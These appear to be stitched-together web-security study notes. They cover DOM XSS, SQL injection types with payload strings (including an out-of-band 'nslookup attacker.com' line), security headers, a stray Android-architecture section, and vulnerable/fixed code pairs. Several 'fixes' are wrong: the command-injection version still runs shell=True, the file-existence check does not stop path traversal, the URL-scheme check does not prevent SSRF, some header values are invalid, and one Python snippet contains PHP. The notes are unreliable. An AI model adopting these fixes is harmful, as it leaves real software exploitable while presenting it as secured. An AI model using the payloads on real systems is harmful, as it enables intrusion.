### **DOM XSS Overview in Details**

| **Aspect**        | **Details**                                                                                                                                      |
|-------------------|--------------------------------------------------------------------------------------------------------------------------------------------------|
| **Definition**    | DOM-based Cross-Site Scripting (DOM XSS) is a type of XSS attack where the vulnerability exists in the client-side code (JavaScript) rather than in the server-side code. It occurs when an attacker can manipulate the DOM (Document Object Model) of a web page in such a way that malicious scripts are executed in the user's browser. |
| **Conditions**    | - **Client-side JavaScript**: The attack relies on JavaScript code running in the user's browser. <br> - **Manipulated Input**: User input is improperly handled or sanitized, allowing script injection. <br> - **Dynamic Content**: Web pages dynamically update content based on user input or URL parameters. |
| **Where Performed** | - **URL Parameters**: Injecting scripts through URL query parameters. <br> - **DOM Manipulation**: Exploiting JavaScript functions that update the DOM using user input (e.g., `document.write`, `innerHTML`). <br> - **User Input**: Malicious input in fields or data that is dynamically added to the page. |
| **Examples**      | - **Example 1**: If a web application uses the following code to reflect a URL parameter into the page without proper validation: <br> `document.getElementById("output").innerHTML = location.hash.substring(1);` <br> An attacker can exploit this by visiting a URL like `http://example.com/#<script>alert('XSS')</script>`, causing the script to execute in the browser. <br><br> - **Example 2**: A web page that uses `document.location` to dynamically insert content into the page: <br> `document.getElementById("content").innerHTML = document.location.search.substring(1);` <br> If an attacker crafts a URL like `http://example.com/?<script>alert('XSS')</script>`, the script will execute on the page. <br><br> - **Example 3**: A site using `eval()` to execute JavaScript code from user input: <br> `eval(document.getElementById("codeInput").value);` <br> If an attacker inputs `<script>alert('XSS')</script>` into the `codeInput` field, it will be executed when `eval()` runs. |


### SQL Injection and Its Types


| **Type**                       | **Sub-Type**                  | **Description**                                                                                      | **Example Commands**                                  |
|-------------------------------|-------------------------------|------------------------------------------------------------------------------------------------------|-----------------------------------------------------|
| **In-band SQL Injection**      |                               | Uses the same communication channel for both launching the attack and retrieving results              |                                                     |
|                                | a) **Union-based SQLi**       | Utilizes the SQL UNION operator to combine the results of multiple SELECT queries into a single result set | `1 UNION SELECT username, password FROM users, ' UNION SELECT null, null--, ' UNION SELECT null, null, null--, ' UNION SELECT null, null, null, null--` |
|                                | b) **Error-based SQLi**       | Injects SQL code that triggers database errors, potentially revealing information about the database schema or contents | `AND 1=1--, SELECT 1/0--, AND 1=0--, AND 1=1#, OR 1=1, OR x=x` |
| **Blind SQL Injection**        |                               | The attacker does not see the result of the query directly but infers information from the application's responses |                                                     |
|                                | a) **Boolean-based Blind SQLi** | Sends SQL queries that result in true or false responses to infer data based on the application's behavior | `' OR '1'='1, ' OR 1=1--, " OR "" = ", " OR 1 = 1--, ' OR '' = ', ' OR 1=1 AND 'a'='a` |
|                                | b) **Time-based Blind SQLi**  | Introduces delays in SQL queries to infer data based on the application's response time              | `SLEEP(5)--, " OR SLEEP(5)--, ' OR SLEEP(5)--, WAITFOR DELAY '00:00:10'--` |
| **Out-of-band SQL Injection**  |                               | Uses alternative communication channels (such as DNS or HTTP) to exfiltrate data                      | `http://example.com/somepage.php?id=1; nslookup attacker.com` |
| **Second-order SQL Injection** |                               | The malicious payload is stored within the application's database and executed later when certain conditions are met | `INSERT INTO users (username, password) VALUES ('test', 'test'); -- The stored payload executes later when the application processes the data` |

|-------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------|
| **Content-Security-Policy**  | In simple terms, the purpose of the "Content Security Policy" (CSP) header is to help protect websites from malicious attacks, particularly Cross-Site Scripting (XSS).          | `Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval';`<br>`Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com ;`<br><br> **Example 2:**<br>`Content-Security-Policy: default-src 'self' https://example.com;`<br>`Content-Security-Policy: default-src 'self'; script-src 'self' https://example.com;` |
| **X-Frame-Options**          | X-Frame-Options : Tell the browser whether you want to allow your site to be framed or not. By preventing a browser from framing your site you can defend against attacks like clickjacking. | `X-Frame-Options: SAMEORIGIN`<br>`X-Frame-Options: Self`                                                                                                                                 |
| **X-Content-Type-Options**   | X-Content-Type-Options stops a browser from trying to MIME-sniff the content type and force it to stick with the declared content-type.                                             | `X-Content-Type-Options: no sniff"`                                                                                                                                                      |
| **Referrer-Policy**          | In simpler terms, the purpose of the "Referrer Policy" header is to control how much information the browser shares when you click on a link and leave a webpage.                | **Vulnerable Example:**<br>`Referrer-Policy: unsafe-url`<br>This setting allows the full URL (including path and query parameters) to be sent in the Referer header, potentially exposing sensitive information.<br><br>**Fix Example:**<br>`Referrer-Policy: strict-origin`<br>This setting instructs the browser to include only the origin (scheme, host, and port) of the referring URL in the Referer header, enhancing user privacy and security. |
| **Permissions-Policy**       | - **Purpose:** Controls which browser features and APIs can be used.<br>- **Vulnerable Example:** Permissions-Policy:accelerometer=*<br>This setting allows any origin to access the device's accelerometer API, potentially leading to unauthorized access or misuse of sensitive device capabilities.<br>- **Fix Example:** Permissions-Policy: accelerometer=()<br>This setting restricts access to the accelerometer API to the same origin only, preventing unauthorized access and reducing the risk of exploitation. | `Permissions-Policy: camera=*, geolocation=*, microphone=*`<br>This policy allows any origin to access the camera, geolocation, and microphone APIs, potentially leading to unauthorized access or misuse of sensitive device capabilities:<br>`Permissions-Policy: camera=(), geolocation=(), microphone=()`<br>This policy restricts access to the camera, geolocation, and microphone APIs to the same origin only, preventing unauthorized access and reducing the risk of exploitation. |

Android architecture contains different number of components to support any android device
needs. Android software contains an open-source Linux Kernel having collection of number of C/C++
libraries which are exposed through an application framework services.

Among all the components Linux Kernel provides main functionality of operating system functions to
smartphones and Dalvik Virtual Machine (DVM) provide platform for running an android application.

The main components of android architecture are following:-

- Applications
- Application Framework
- Android Runtime
- Platform Libraries
- Linux Kernel

| **Component**              | **Description**                                                                                                   |
|----------------------------|-------------------------------------------------------------------------------------------------------------------|
| **Applications**           | Top layer where pre-installed and third-party applications reside. Runs within Android runtime using framework services. |
| **Application Framework** | Provides essential classes for creating applications, including services like activity manager and notification manager. |
| **Android Runtime**        | Contains core libraries and Dalvik Virtual Machine (DVM) that support application execution.                        |

| **Server-Side Request Forgery (SSRF)**<br>```python<br>import requests<br><br>def fetch_url(url):<br>    response = requests.get(url)  # Vulnerable<br>    return response.text<br>``` | ```python<br>import requests<br><br>def fetch_url(url):<br>    if not url.startswith(('http://', 'https://')):<br>        raise ValueError('Invalid URL')<br>    response = requests.get(url)<br>    return response.text<br>``` | URL validation ensures the URL starts with `http://` or `https://`, reducing the risk of SSRF by preventing unauthorized internal requests. |
| **Cross-Site Scripting (XSS)**<br>```python<br>from flask import Flask, request, render_template_string, escape<br><br>app = Flask(__name__)<br><br>@app.route('/')<br>def index():<br>    name = request.args.get('name', 'Guest')<br>    return render_template_string('<h1>Hello, {{ name }}</h1>', name=name)  # Vulnerable<br>``` | ```python<br>from flask import Flask, request, render_template_string, escape<br><br>app = Flask(__name__)<br><br>@app.route('/')<br>def index():<br>    name = request.args.get('name', 'Guest')<br>    return render_template_string('<h1>Hello, {{ name | safe }}</h1>', name=escape(name))  # Fixed<br>``` |  Using the `escape` function from Flask to escape user input and the `safe` filter in templates prevents XSS by neutralizing potentially harmful content. |
| **Cross-Site Request Forgery (CSRF)**<br>```html<br>&lt;form action="/transfer" method="post"&gt;<br>    &lt;input type="hidden" name="csrf_token" value="{{ csrf_token }}"&gt;<br>    &lt;input type="hidden" name="amount" value="1000"&gt;<br>    &lt;input type="submit" value="Transfer Money"&gt;<br>&lt;/form&gt;<br>``` | CSRF tokens (`csrf_token`) are included in forms to ensure that requests are made by authenticated users, preventing unauthorized actions from external sites. |
| **OS Command Injection**<br>```python<br>import subprocess<br><br>def execute_command(command):<br>    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)  # Vulnerable<br>    return result.decode("utf-8")<br>``` | ```python<br>import subprocess<br><br>def execute_command(command):<br>    try:<br>        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)<br>        return result.decode("utf-8")<br>    except subprocess.CalledProcessError as e:<br>        return f"Error: {e}"<br>``` | Using `subprocess` with exception handling prevents command injection. The code safely captures output and errors, avoiding unintended command execution. |
| **Local File Inclusion (LFI)**<br>```python<br>import os<br><br>def read_file(file_path):<br>    with open(file_path, 'r') as file:<br>        content = file.read()<br>    return content<br>``` | ```python<br>import os<br><br>def read_file(file_path):<br>    if not os.path.isfile(file_path):<br>        return "File not found"<br>    with open(file_path, 'r') as file:<br>        content = file.read()<br>    return content<br>``` |  Checking if the file exists using `os.path.isfile` before opening it prevents unauthorized file access and reduces the risk of including unintended files. |
| **Remote File Inclusion (RFI)**<br>```python<br>import requests<br><br>def fetch_remote_file(url):<br>    if not filter_var(url, FILTER_VALIDATE_URL):<br>        raise Exception('Invalid URL')<br>    return requests.get(url).text<br>``` | ```python<br>import requests<br><br>def fetch_remote_file(url):<br>    if not url.startswith(('http://', 'https://')):<br>        return "Invalid URL"<br>    response = requests.get(url)<br>    if response.status_code != 200:<br>        return "Failed to fetch remote file"<br>    return response.text<br>``` | URL validation (`url.startswith`) and checking HTTP status codes ensure that only valid and accessible URLs are processed, mitigating risks from remote file inclusion. |
| **Docker Image Vulnerability**<br>```dockerfile<br># Vulnerable Dockerfile<br>FROM ubuntu:latest<br>RUN apt-get update && apt-get install -y vulnerable-package<br>``` | ```dockerfile<br># Fixed Dockerfile<br>FROM ubuntu:latest<br>RUN apt-get update && apt-get install -y secure-package<br>``` | Replacing vulnerable packages with their secure versions reduces known security risks in Docker images. Regular updates and security patches are crucial. |
| **Kubernetes Secrets Exposure**<br>```yaml<br># Vulnerable Kubernetes Deployment<br>apiVersion: apps/v1<br>kind: Deployment<br>metadata:<br>  name: myapp<br>spec:<br>  template:<br>    spec:<br>      containers:<br>        - name: myapp<br>          image: myapp:latest<br>          env:<br>            - name: SECRET_KEY<br>              value: "mysecretkey"<br>``` | ```yaml<br># Fixed Kubernetes Deployment<br>apiVersion: apps/v1<br>kind: Deployment<br>metadata:<br>  name: myapp<br>spec:<br>  template:<br>    spec:<br>      containers:<br>        - name: myapp<br>          image: myapp:latest<br>          env:<br>            - name: SECRET_KEY<br>              valueFrom:<br>                secretKeyRef:<br>                  name: myapp-secrets<br>                  key: secret_key<br>``` |  Using Kubernetes Secrets (`valueFrom: secretKeyRef`) instead of plaintext values in deployment configurations enhances security by managing sensitive data securely. |
| **Jenkins Credentials Exposure**<br>```groovy<br>// Vulnerable Jenkins Pipeline<br>node {<br>  stage('Build') {<br>    sh 'some_command --key=mysecretkey'<br>  }<br>}<br>``` | ```groovy<br>// Fixed Jenkins Pipeline<br>node {<br>  stage('Build') {<br>    withCredentials([string(credentialsId: 'mysecretkey-id', variable: 'SECRET_KEY')]) {<br>      sh 'some_command --key=$SECRET_KEY'<br>    }<br>  }<br>}<br>``` |  Jenkins' `withCredentials` block securely handles sensitive information by using credentials stored in Jenkins' credentials management system, preventing exposure in scripts. |
| **Git Credential Exposure**<br>```bash<br># Vulnerable Git config<br>git config --global user.name "username"<br>git config --global user.password "password"<br>``` | ```bash<br># Fixed Git config<br># Store credentials securely using Git credential helper<br>git config --global credential.helper store<br>``` |  Configuring Git to use a credential helper (`credential.helper store`) securely manages credentials, avoiding plaintext storage and enhancing security. |


### > Vulnerable code Challenge:

## SQL Injection (SQLi)
- Vulnerable Code: Direct concatenation of user input into SQL query.
- Fix: Use parameterized queries to separate data from commands.

```python
import sqlite3

def get_user(username):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE username = '" + username + "'")  # Vulnerable
    return cursor.fetchone() 
```

 - **Fixed Code**
```python
def get_user(username):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE username = ?", (username,))  # Fixed
    return cursor.fetchone() 
```

## Server-Side Request Forgery (SSRF)
- Vulnerable Code: Direct use of user-controlled input in HTTP requests.
- Fix: Validate and restrict user-supplied URLs to prevent SSRF.
```python
import requests

def fetch_url(url):
    response = requests.get(url)  # Vulnerable
    return response.text
```

 -  **Fixed Code**
```python
def fetch_url(url):
    if not url.startswith('http://') and not url.startswith('https://'):
        raise ValueError('Invalid URL')
    response = requests.get(url)
    return response.text
```

## Cross-Site Scripting (XSS)
- Vulnerable Code: Rendering user input without proper escaping.
- Fix: Use escaping functions to prevent injection of malicious scripts.

```python
from flask import Flask, request, render_template_string, escape

app = Flask(__name__)

@app.route('/')
def index():
    name = request.args.get('name', 'Guest')
    return render_template_string('<h1>Hello, {{ name }}</h1>', name=name)  # Vulnerable
```

- **Fixed Code**

```python
 @app.route('/')
 def index():
    name = request.args.get('name', 'Guest')
    return render_template_string('<h1>Hello, {{ name | safe }}</h1>', name=escape(name))  # Fixed
```


## Cross-Site Request Forgery (CSRF)
- Vulnerable Code: Lack of CSRF token protection in forms.
- Fix: Include CSRF tokens in forms and AJAX requests.

```python
<form action="/transfer" method="post">
    <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
    <input type="hidden" name="amount" value="1000">
    <input type="submit" value="Transfer Money">
</form>
```

## OS Command Injection
- Vulnerable Code: Direct use of user input in system commands without validation.
- Fix: Use subprocess module with proper input validation and sanitization.
```python
import subprocess

def execute_command(command):
    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)  # Vulnerable
    return result.decode("utf-8")
```

 - **Fixed Code**
```py
def execute_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result.decode("utf-8")
    except subprocess.CalledProcessError as e:
        return f"Error: {e}"
```

## Local File Inclusion (LFI)
- Vulnerable Code: Directly opens a file without proper validation.
- Fix: Check if the file exists before reading its content.
```python
def read_file(file_path):
    with open(file_path, 'r') as file:
        content = file.read()
    return content
```
 - **Fixed Code**
```py
def read_file_fixed(file_path):
    if not os.path.isfile(file_path):
        return "File not found"
    with open(file_path, 'r') as file:
        content = file.read()
    return content
```

## Remote File Inclusion (RFI)
- Vulnerable Code: Makes an HTTP request to a user-supplied URL without proper validation.
- Fix: Check if the URL starts with 'http://' or 'https://' and handle HTTP errors properly.
```python
def fetch_remote_file(url):
    if not filter_var($url, FILTER_VALIDATE_URL):
        throw new Exception('Invalid URL')
    return file_get_contents($url)
```
  - **Fixed Code**
```py
def fetch_remote_file(url):
    if not url.startswith(('http://', 'https://')):
        return "Invalid URL"
    response = requests.get(url)
    if response.status_code != 200:
        return "Failed to fetch remote file"
    return response.text

```
